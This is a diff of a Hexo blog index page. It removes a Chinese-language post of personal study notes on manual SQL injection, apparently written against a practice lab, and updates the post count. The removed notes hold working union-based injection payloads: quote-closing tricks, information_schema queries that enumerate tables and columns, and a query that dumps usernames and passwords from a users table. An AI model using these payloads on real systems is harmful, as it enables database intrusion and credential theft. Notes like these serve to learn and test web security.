@@ -146,70 +146,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2021/11/22/sql%E5%AD%A6%E4%B9%A01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/22/sql%E5%AD%A6%E4%B9%A01/" class="post-title-link" itemprop="url">sql学习1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-11-22 22:36:40 / Modified: 22:38:52" itemprop="dateCreated datePublished" datetime="2021-11-22T22:36:40+08:00">2021-11-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>sql 1<br>常见手动 sql 注入的闭合方式<br>or 1=1<br>‘or 1=1<br>“or 1=1<br>)or 1=1<br>‘)or 1=1<br>“) or 1=1<br>“))or 1=1</p>
-<p>具体使用哪种方式取决于 SQL语句使用了什么方式，我们可以在注入点输入 反斜杠 \ 来判断页面使用的哪种闭合方式</p>
-<p>\ 表示转义，直接输入 \ 会将字段的闭合方式暴露出来，因为被转义不生效，导致SQL 语句报错，并爆出闭合方式</p>
-<p>弹出： ‘1’ LIMIT 0,1 这个错。发现\转义后有一个单引号，说明此 sql 语句基于单引号闭合。<br>爆破库名<br>-1’ union select 1,2,database()–+<br>1,2,database()<br>database() 替换了字段3，作用是查询当前数据库名称，其中1，2是为了补充 第一个和第二个字段的显示结果<br>拓展，常用<br>version()    – MySQL版本<br>user()       – 数据库用户名<br>database()   – 数据库名称<br>@@datadir    – 数据库路径<br>@@version_compile_os  – 操作系统版本<br>列出当前数据库中的所有表的名称<br>5.0以下和5.0以上的区别    5.0以下没有 information_schema 这个数据表，只能爆破表<br>5.0以下多用户单操作，5.0以上多用户多操作<br>查看 information_schema 库中 tables 表名 table_schema 等于 security 的相关信息</p>
-<p>table_schema  – 该字段存储数据库名<br>table_name    – 该字段存储对应数据中的包括的表名<br>列出所有表名<br>-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database();–+<br>查询表中字段名<br>-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’数据库表的名字’–+</p>
-<p>-1’ union select 1,2,group_concat(一个或多个字段名，逗号分隔) from 表名–+或<br> union select 1,group_concat(username,0x3a,0x3a,password),3 from users –+（这里的1，2或1，3是为了构造一个数列来回显）<br>使用冒号将用户名和密码分开 0x3a<br>我们可以在每一个用户名：密码后面添加一个换行符; 0x3C,0x68,0x72,0x2F,0x3E</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -825,7 +761,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
